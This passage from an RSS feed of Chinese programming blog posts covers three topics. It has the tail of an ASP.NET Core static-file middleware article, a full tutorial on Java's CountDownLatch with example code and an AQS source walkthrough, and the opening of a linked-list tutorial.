                    context.Response.StatusCode &lt;/span&gt;= &lt;span&gt;302&lt;/span&gt;&lt;span&gt;;
                    context.Response.GetTypedHeaders().Location &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Uri(path.Value +&lt;span&gt; context.Request.QueryString);
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将针对目录的URL更新为针对默认文件的URL&lt;/span&gt;
                context.Request.Path = &lt;span&gt;new&lt;/span&gt; PathString($&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{context.Request.Path}{fileName}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
        }
        &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; _next(context);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;由于DefaultFilesMiddleware中间件采用URL重写的方式来响应默认文件，默认文件的内容其实还是通过StaticFileMiddleware中间件予以响应的，所以针对后者的注册是必需的。也正是这个原因，DefaultFilesMiddleware中间件需要优先注册，以确保URL重写发生在StaticFileMiddleware响应文件之前。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/static-file-middleware-01.html&quot;&gt;静态文件中间件[1]: 搭建文件服务器&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/static-file-middleware-02.html&quot;&gt;静态文件中间件[2]: 条件请求以提升性能&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/static-file-middleware-03.html&quot;&gt;静态文件中间件[3]: 区间请求以提供部分内容&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/static-file-middleware-04.html&quot;&gt;静态文件中间件[4]: StaticFileMiddleware&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/static-file-middleware-05.html&quot;&gt;静态文件中间件[5]: DirectoryBrowserMiddleware &amp;amp; DefaultFilesMiddleware&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 21 Dec 2020 00:59:00 +0000</pubDate>
<dc:creator>Artech</dc:creator>
<og:description>目录 一、DirectoryBrowserMiddleware中间件 二、自定义IDirectoryFormatter 三、DefaultFilesMiddleware中间件 一、DirectoryB</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/artech/p/static-file-middleware-05.html</dc:identifier>
</item>
<item>
<title>一文搞懂 CountDownLatch 用法和源码！ - 程序员cxuan</title>
<link>http://www.cnblogs.com/cxuanBlog/p/14166322.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/cxuanBlog/p/14166322.html</guid>
<description>&lt;p&gt;&lt;code&gt;CountDownLatch&lt;/code&gt; 是多线程控制的一种工具，它被称为 &lt;code&gt;门阀&lt;/code&gt;、 &lt;code&gt;计数器&lt;/code&gt;或者 &lt;code&gt;闭锁&lt;/code&gt;。这个工具经常用来用来协调多个线程之间的同步，或者说起到线程之间的通信（而不是用作互斥的作用）。下面我们就来一起认识一下 CountDownLatch&lt;/p&gt;
&lt;blockquote readability=&quot;4&quot;&gt;
&lt;p&gt;我把自己以往的文章汇总成为了 Github ，欢迎各位大佬 star&lt;br/&gt;&lt;a href=&quot;https://github.com/crisxuan/bestJavaer&quot; target=&quot;_blank&quot;&gt;https://github.com/crisxuan/bestJavaer&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;认识-countdownlatch&quot;&gt;认识 CountDownLatch&lt;/h2&gt;
&lt;p&gt;CountDownLatch 能够使一个线程在等待另外一些线程完成各自工作之后，再继续执行。它相当于是一个计数器，这个计数器的初始值就是线程的数量，每当一个任务完成后，计数器的值就会减一，当计数器的值为 0 时，表示所有的线程都已经任务了，然后在 CountDownLatch 上等待的线程就可以恢复执行接下来的任务。&lt;/p&gt;
&lt;h2 id=&quot;countdownlatch-的使用&quot;&gt;CountDownLatch 的使用&lt;/h2&gt;
&lt;p&gt;CountDownLatch 提供了一个构造方法，你必须指定其初始值，还指定了 &lt;code&gt;countDown&lt;/code&gt; 方法，这个方法的作用主要用来减小计数器的值，当计数器变为 0 时，在 CountDownLatch 上 &lt;code&gt;await&lt;/code&gt; 的线程就会被唤醒，继续执行其他任务。当然也可以延迟唤醒，给 CountDownLatch 加一个延迟时间就可以实现。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s3.ax1x.com/2020/12/21/rdcSKK.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其主要方法如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s3.ax1x.com/2020/12/21/rd6xv6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;CountDownLatch 主要有下面这几个应用场景&lt;/p&gt;
&lt;h3 id=&quot;countdownlatch-应用场景&quot;&gt;CountDownLatch 应用场景&lt;/h3&gt;
&lt;p&gt;典型的应用场景就是当一个服务启动时，同时会加载很多组件和服务，这时候主线程会等待组件和服务的加载。当所有的组件和服务都加载完毕后，主线程和其他线程在一起完成某个任务。&lt;/p&gt;
&lt;p&gt;CountDownLatch 还可以实现学生一起比赛跑步的程序，CountDownLatch 初始化为学生数量的线程，鸣枪后，每个学生就是一条线程，来完成各自的任务，当第一个学生跑完全程后，CountDownLatch 就会减一，直到所有的学生完成后，CountDownLatch 会变为 0 ，接下来再一起宣布跑步成绩。&lt;/p&gt;
&lt;p&gt;顺着这个场景，你自己就可以延伸、拓展出来很多其他任务场景。&lt;/p&gt;
&lt;h3 id=&quot;countdownlatch-用法&quot;&gt;CountDownLatch 用法&lt;/h3&gt;
&lt;p&gt;下面我们通过一个简单的计数器来演示一下 CountDownLatch 的用法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class TCountDownLatch {

    public static void main(String[] args) {
        CountDownLatch latch = new CountDownLatch(5);
        Increment increment = new Increment(latch);
        Decrement decrement = new Decrement(latch);

        new Thread(increment).start();
        new Thread(decrement).start();

        try {
            Thread.sleep(6000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}

class Decrement implements Runnable {

    CountDownLatch countDownLatch;

    public Decrement(CountDownLatch countDownLatch){
        this.countDownLatch = countDownLatch;
    }

    @Override
    public void run() {
        try {

            for(long i = countDownLatch.getCount();i &amp;gt; 0;i--){
                Thread.sleep(1000);
                System.out.println(&quot;countdown&quot;);
                this.countDownLatch.countDown();
            }

        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}


class Increment implements Runnable {

    CountDownLatch countDownLatch;

    public Increment(CountDownLatch countDownLatch){
        this.countDownLatch = countDownLatch;
    }

    @Override
    public void run() {
        try {
            System.out.println(&quot;await&quot;);
            countDownLatch.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println(&quot;Waiter Released&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在 main 方法中我们初始化了一个计数器为 5 的 CountDownLatch，在 Decrement 方法中我们使用 &lt;code&gt;countDown&lt;/code&gt; 执行减一操作，然后睡眠一段时间，同时在 Increment 类中进行等待，直到 Decrement 中的线程完成计数减一的操作后，唤醒 Increment 类中的 run 方法，使其继续执行。&lt;/p&gt;
&lt;p&gt;下面我们再来通过学生赛跑这个例子来演示一下 CountDownLatch 的具体用法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class StudentRunRace {

    CountDownLatch stopLatch = new CountDownLatch(1);
    CountDownLatch runLatch = new CountDownLatch(10);

    public void waitSignal() throws Exception{
        System.out.println(&quot;选手&quot; + Thread.currentThread().getName() + &quot;正在等待裁判发布口令&quot;);
        stopLatch.await();
        System.out.println(&quot;选手&quot; + Thread.currentThread().getName() + &quot;已接受裁判口令&quot;);
        Thread.sleep((long) (Math.random() * 10000));
        System.out.println(&quot;选手&quot; + Thread.currentThread().getName() + &quot;到达终点&quot;);
        runLatch.countDown();
    }

    public void waitStop() throws Exception{
        Thread.sleep((long) (Math.random() * 10000));
        System.out.println(&quot;裁判&quot;+Thread.currentThread().getName()+&quot;即将发布口令&quot;);
        stopLatch.countDown();
        System.out.println(&quot;裁判&quot;+Thread.currentThread().getName()+&quot;已发送口令，正在等待所有选手到达终点&quot;);
        runLatch.await();
        System.out.println(&quot;所有选手都到达终点&quot;);
        System.out.println(&quot;裁判&quot;+Thread.currentThread().getName()+&quot;汇总成绩排名&quot;);
    }

    public static void main(String[] args) {
        ExecutorService service = Executors.newCachedThreadPool();
        StudentRunRace studentRunRace = new StudentRunRace();
        for (int i = 0; i &amp;lt; 10; i++) {
            Runnable runnable = () -&amp;gt; {
                try {
                    studentRunRace.waitSignal();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            };
            service.execute(runnable);
        }
        try {
            studentRunRace.waitStop();
        } catch (Exception e) {
            e.printStackTrace();
        }
        service.shutdown();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面我们就来一起分析一下 &lt;code&gt;CountDownLatch&lt;/code&gt; 的源码&lt;/p&gt;
&lt;h2 id=&quot;countdownlatch-源码分析&quot;&gt;CountDownLatch 源码分析&lt;/h2&gt;
&lt;p&gt;CountDownLatch 使用起来比较简单，但是却非常有用，现在你可以在你的工具箱中加上 CountDownLatch 这个工具类了。下面我们就来深入认识一下 CountDownLatch。&lt;/p&gt;
&lt;p&gt;CountDownLatch 的底层是由 &lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt; 支持，而 AQS 的数据结构的核心就是两个队列，一个是 &lt;code&gt;同步队列(sync queue)&lt;/code&gt;，一个是&lt;code&gt;条件队列(condition queue)&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;sync-内部类&quot;&gt;Sync 内部类&lt;/h3&gt;
&lt;p&gt;CountDownLatch 在其内部是一个 Sync ，它继承了 AQS 抽象类。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private static final class Sync extends AbstractQueuedSynchronizer {...}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;CountDownLatch 其实其内部只有一个 &lt;code&gt;sync&lt;/code&gt; 属性，并且是 final 的&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private final Sync sync;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;CountDownLatch 只有一个带参数的构造方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public CountDownLatch(int count) {
  if (count &amp;lt; 0) throw new IllegalArgumentException(&quot;count &amp;lt; 0&quot;);
  this.sync = new Sync(count);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是说，初始化的时候必须指定计数器的数量，如果数量为负会直接抛出异常。&lt;/p&gt;
&lt;p&gt;然后把 count 初始化为 Sync 内部的 count，也就是&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Sync(int count) {
  setState(count);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;注意这里有一个 setState(count)，这是什么意思呢？见闻知意这只是一个设置状态的操作，但是实际上不单单是，还有一层意思是 state 的值代表着待达到条件的线程数。这个我们在聊 countDown 方法的时候再讨论。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;getCount()&lt;/code&gt; 方法的返回值是 &lt;code&gt;getState()&lt;/code&gt; 方法，它是 AbstractQueuedSynchronizer 中的方法，这个方法会返回当前线程计数，具有 volatile 读取的内存语义。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// ---- CountDownLatch ----

int getCount() {
  return getState();
}

// ---- AbstractQueuedSynchronizer ----

protected final int getState() {
  return state;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;tryAcquireShared()&lt;/code&gt; 方法用于获取·共享状态下对象的状态，判断对象是否为 0 ，如果为 0 返回 1 ，表示能够尝试获取，如果不为 0，那么返回 -1，表示无法获取。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected int tryAcquireShared(int acquires) {
  return (getState() == 0) ? 1 : -1;
}

// ----  getState() 方法和上面的方法相同 ----
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个 &lt;code&gt;共享状态&lt;/code&gt; 属于 AQS 中的概念，在 AQS 中分为两种模式，一种是 &lt;code&gt;独占模式&lt;/code&gt;，一种是 &lt;code&gt;共享模式&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;tryAcquire 独占模式，尝试获取资源，成功则返回 true，失败则返回 false。&lt;/li&gt;
&lt;li&gt;tryAcquireShared 共享方式，尝试获取资源。负数表示失败；0 表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;code&gt;tryReleaseShared()&lt;/code&gt; 方法用于共享模式下的释放&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected boolean tryReleaseShared(int releases) {
  // 减小数量，变为 0 的时候进行通知。
  for (;;) {
    int c = getState();
    if (c == 0)
      return false;
    int nextc = c-1;
    if (compareAndSetState(c, nextc))
      return nextc == 0;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个方法是一个无限循环，获取线程状态，如果线程状态是 0 则表示没有被线程占有，没有占有的话那么直接返回 false ，表示已经释放；然后下一个状态进行 - 1 ，使用 compareAndSetState CAS 方法进行和内存值的比较，如果内存值也是 1 的话，就会更新内存值为 0 ，判断 nextc 是否为 0 ，如果 CAS 比较不成功的话，会再次进行循环判断。&lt;/p&gt;
&lt;blockquote readability=&quot;3.5714285714286&quot;&gt;
&lt;p&gt;如果 CAS 用法不清楚的话，读者朋友们可以参考这篇文章 &lt;a href=&quot;https://mp.weixin.qq.com/s/vbXAgNH9PyL16PmjgnGKZA&quot; target=&quot;_blank&quot;&gt;告诉你一个 AtomicInteger 的惊天大秘密！&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;await-方法&quot;&gt;await 方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;await()&lt;/code&gt; 方法是 CountDownLatch 一个非常重要的方法，基本上可以说只有 countDown 和 await 方法才是 CountDownLatch 的精髓所在，这个方法将会使当前线程在 CountDownLatch 计数减至零之前一直等待，除非线程被中断。&lt;/p&gt;
&lt;p&gt;CountDownLatch 中的 await 方法有两种，一种是不带任何参数的 &lt;code&gt;await()&lt;/code&gt;，一种是可以等待一段时间的&lt;code&gt;await(long timeout, TimeUnit unit)&lt;/code&gt;。下面我们先来看一下 await() 方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void await() throws InterruptedException {
  sync.acquireSharedInterruptibly(1);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;await 方法内部会调用 acquireSharedInterruptibly 方法，这个 acquireSharedInterruptibly 是 AQS 中的方法，以共享模式进行中断。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final void acquireSharedInterruptibly(int arg)
  throws InterruptedException {
  if (Thread.interrupted())
    throw new InterruptedException();
  if (tryAcquireShared(arg) &amp;lt; 0)
    doAcquireSharedInterruptibly(arg);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，acquireSharedInterruptibly 方法的内部会首先判断线程是否&lt;code&gt;中断&lt;/code&gt;，如果线程中断，则直接抛出线程中断异常。如果没有中断，那么会以共享的方式获取。如果能够在共享的方式下不能获取锁，那么就会以共享的方式断开链接。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void doAcquireSharedInterruptibly(int arg)
  throws InterruptedException {
  final Node node = addWaiter(Node.SHARED);
  boolean failed = true;
  try {
    for (;;) {
      final Node p = node.predecessor();
      if (p == head) {
        int r = tryAcquireShared(arg);
        if (r &amp;gt;= 0) {
          setHeadAndPropagate(node, r);
          p.next = null; // help GC
          failed = false;
          return;
        }
      }
      if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
          parkAndCheckInterrupt())
        throw new InterruptedException();
    }
  } finally {
    if (failed)
      cancelAcquire(node);
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个方法有些长，我们分开来看&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先，会先构造一个共享模式的 Node 入队&lt;/li&gt;
&lt;li&gt;然后使用无限循环判断新构造 node 的前驱节点，如果 node 节点的前驱节点是头节点，那么就会判断线程的状态，这里调用了一个 setHeadAndPropagate ,其源码如下&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void setHeadAndPropagate(Node node, int propagate) {
  Node h = head; 
  setHead(node);
  if (propagate &amp;gt; 0 || h == null || h.waitStatus &amp;lt; 0 ||
      (h = head) == null || h.waitStatus &amp;lt; 0) {
    Node s = node.next;
    if (s == null || s.isShared())
      doReleaseShared();
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先会设置头节点，然后进行一系列的判断，获取节点的获取节点的后继，以共享模式进行释放，就会调用 doReleaseShared 方法，我们再来看一下 doReleaseShared 方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void doReleaseShared() {

  for (;;) {
    Node h = head;
    if (h != null &amp;amp;&amp;amp; h != tail) {
      int ws = h.waitStatus;
      if (ws == Node.SIGNAL) {
        if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))
          continue;            // loop to recheck cases
        unparkSuccessor(h);
      }
      else if (ws == 0 &amp;amp;&amp;amp;
               !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))
        continue;                // loop on failed CAS
    }
    if (h == head)                   // loop if head changed
      break;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个方法会以无限循环的方式首先判断头节点是否等于尾节点，如果头节点等于尾节点的话，就会直接退出。如果头节点不等于尾节点，会判断状态是否为 SIGNAL，不是的话就继续循环 compareAndSetWaitStatus，然后断开后继节点。如果状态不是 SIGNAL，也会调用 compareAndSetWaitStatus 设置状态为 PROPAGATE，状态为 0 并且不成功，就会继续循环。&lt;/p&gt;
&lt;p&gt;也就是说 setHeadAndPropagate 就是设置头节点并且释放后继节点的一系列过程。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;我们来看下面的 if 判断，也就是 &lt;code&gt;shouldParkAfterFailedAcquire(p, node)&lt;/code&gt; 这里&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
    parkAndCheckInterrupt())
  throw new InterruptedException();
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果上面 Node p = node.predecessor() 获取前驱节点不是头节点，就会进行 park 断开操作，判断此时是否能够断开，判断的标准如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private static boolean shouldParkAfterFailedAcquire(Node pred, Node node) {
  int ws = pred.waitStatus;
  if (ws == Node.SIGNAL)
    return true;
  if (ws &amp;gt; 0) {
    do {
      node.prev = pred = pred.prev;
    } while (pred.waitStatus &amp;gt; 0);
    pred.next = node;
  } else {
    compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
  }
  return false;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个方法会判断 Node p 的前驱节点的&lt;code&gt;结点状态(waitStatus)&lt;/code&gt;，节点状态一共有五种，分别是&lt;/p&gt;
&lt;ol readability=&quot;4.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;code&gt;CANCELLED(1)&lt;/code&gt;：表示当前结点已取消调度。当超时或被中断（响应中断的情况下），会触发变更为此状态，进入该状态后的结点将不会再变化。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;code&gt;SIGNAL(-1)&lt;/code&gt;：表示后继结点在等待当前结点唤醒。后继结点入队时，会将前继结点的状态更新为 SIGNAL。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;CONDITION(-2)&lt;/code&gt;：表示结点等待在 Condition 上，当其他线程调用了 Condition 的 signal() 方法后，CONDITION状态的结点将&lt;strong&gt;从等待队列转移到同步队列中&lt;/strong&gt;，等待获取同步锁。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;code&gt;PROPAGATE(-3)&lt;/code&gt;：共享模式下，前继结点不仅会唤醒其后继结点，同时也可能会唤醒后继的后继结点。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;0&lt;/code&gt;：新结点入队时的默认状态。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;如果前驱节点是 SIGNAL 就会返回 true 表示可以断开，如果前驱节点的状态大于 0 (此时为什么不用 ws == Node.CANCELLED ) 呢？因为 ws 大于 0 的条件只有 CANCELLED 状态了。然后就是一系列的查找遍历操作直到前驱节点的 waitStatus &amp;gt; 0。如果 ws &amp;lt;= 0 ，而且还不是 SIGNAL 状态的话，就会使用 CAS 替换前驱节点的 ws 为 SIGNAL 状态。&lt;/p&gt;
&lt;p&gt;如果检查判断是中断状态的话，就会返回 false。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private final boolean parkAndCheckInterrupt() {
  LockSupport.park(this);
  return Thread.interrupted();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个方法使用 &lt;code&gt;LockSupport.park&lt;/code&gt; 断开连接，然后返回线程是否中断的标志。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;cancelAcquire()&lt;/code&gt; 用于取消等待队列，如果等待过程中没有成功获取资源（如timeout，或者可中断的情况下被中断了），那么取消结点在队列中的等待。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void cancelAcquire(Node node) {
  if (node == null)
    return;

  node.thread = null;
  
  Node pred = node.prev;
  while (pred.waitStatus &amp;gt; 0)
    node.prev = pred = pred.prev;

  Node predNext = pred.next;

  node.waitStatus = Node.CANCELLED;

  if (node == tail &amp;amp;&amp;amp; compareAndSetTail(node, pred)) {
    compareAndSetNext(pred, predNext, null);
  } else {
    int ws;
    if (pred != head &amp;amp;&amp;amp;
        ((ws = pred.waitStatus) == Node.SIGNAL ||
         (ws &amp;lt;= 0 &amp;amp;&amp;amp; compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) &amp;amp;&amp;amp;
        pred.thread != null) {
      Node next = node.next;
      if (next != null &amp;amp;&amp;amp; next.waitStatus &amp;lt;= 0)
        compareAndSetNext(pred, predNext, next);
    } else {
      unparkSuccessor(node);
    }
    node.next = node; // help GC
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以，对 CountDownLatch 的 await 调用大致会有如下的调用过程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s3.ax1x.com/2020/12/21/rd6vgx.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;一个和 await 重载的方法是 &lt;code&gt;await(long timeout, TimeUnit unit)&lt;/code&gt;，这个方法和 await 最主要的区别就是这个方法能够可以等待计数器一段时间再执行后续操作。&lt;/p&gt;
&lt;h3 id=&quot;countdown-方法&quot;&gt;countDown 方法&lt;/h3&gt;
&lt;p&gt;countDown 是和 await 同等重要的方法，countDown 用于减少计数器的数量，如果计数减为 0 的话，就会释放所有的线程。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void countDown() {
  sync.releaseShared(1);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个方法会调用 releaseShared 方法，此方法用于共享模式下的释放操作，首先会判断是否能够进行释放，判断的方法就是 CountDownLatch 内部类 Sync 的 tryReleaseShared 方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final boolean releaseShared(int arg) {
  if (tryReleaseShared(arg)) {
    doReleaseShared();
    return true;
  }
  return false;
}

// ---- CountDownLatch ----

protected boolean tryReleaseShared(int releases) {
  for (;;) {
    int c = getState();
    if (c == 0)
      return false;
    int nextc = c-1;
    if (compareAndSetState(c, nextc))
      return nextc == 0;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;tryReleaseShared 会进行 for 循环判断线程状态值，使用 CAS 不断尝试进行替换。&lt;/p&gt;
&lt;p&gt;如果能够释放，就会调用 doReleaseShared 方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void doReleaseShared() {
  for (;;) {
    Node h = head;
    if (h != null &amp;amp;&amp;amp; h != tail) {
      int ws = h.waitStatus;
      if (ws == Node.SIGNAL) {
        if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))
          continue;            // loop to recheck cases
        unparkSuccessor(h);
      }
      else if (ws == 0 &amp;amp;&amp;amp;
               !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))
        continue;                // loop on failed CAS
    }
    if (h == head)                   // loop if head changed
      break;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，doReleaseShared 其实也是一个无限循环不断使用 CAS 尝试替换的操作。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文是 CountDownLatch 的基本使用和源码分析，CountDownLatch 就是一个基于 AQS 的计数器，它内部的方法都是围绕 AQS 框架来谈的，除此之外还有其他比如 ReentrantLock、Semaphore 等都是 AQS 的实现，所以要研究并发的话，离不开对 AQS 的探讨。CountDownLatch 的源码看起来很少，比较简单，但是其内部比如 await 方法的调用链路却很长，也值得花费时间深入研究。&lt;/p&gt;
&lt;p&gt;我是 cxuan，一枚技术创作的程序员。如果本文你觉得不错的话，跪求读者点赞、在看、分享！&lt;/p&gt;
&lt;p&gt;另外，我自己肝了六本 PDF，微信搜索「程序员cxuan」关注公众号后，在后台回复 cxuan ，领取全部 PDF，这些 PDF 如下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://s3.ax1x.com/2020/11/30/DgOK6f.png&quot; target=&quot;_blank&quot;&gt;六本 PDF 链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1515111/202011/1515111-20201130090550310-1032998206.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 21 Dec 2020 00:55:00 +0000</pubDate>
<dc:creator>程序员cxuan</dc:creator>
<og:description>CountDownLatch 是多线程控制的一种工具，它被称为 门阀、 计数器或者 闭锁。这个工具经常用来用来协调多个线程之间的同步，或者说起到线程之间的通信（而不是用作互斥的作用）。下面我们就来一起</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/cxuanBlog/p/14166322.html</dc:identifier>
</item>
<item>
<title>看不懂的数据结构-链表深度刨析 - 全栈小刘</title>
<link>http://www.cnblogs.com/spiritmark/p/14166314.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/spiritmark/p/14166314.html</guid>
<description>&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;欧克！欧克！小刘今天带大家来学习一下链表 ，你要是学不会，你来捶我&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/img_convert/487b9620f9e57f6af687210ade22b272.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;img src=&quot;https://pic1.zhimg.com/80/v2-e2554484f6756931ab9d721de5573d44_720w.jpg?source=1940ef5c&quot; alt=&quot;img&quot;/&gt;&lt;/blockquote&gt;
&lt;h2 id=&quot;1、链表linked-list介绍&quot;&gt;1、链表(Linked List)介绍&lt;/h2&gt;
&lt;h3 id=&quot;11、内存结构&quot;&gt;1.1、内存结构&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;内存上来看：链表存储空间 &lt;strong&gt;不连续&lt;/strong&gt;（不像数组）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzEzMTkyNjIxMDI1LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;12、逻辑结构&quot;&gt;1.2、逻辑结构&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;逻辑上来看：链表属于 &lt;strong&gt;线性&lt;/strong&gt;结构&lt;/li&gt;
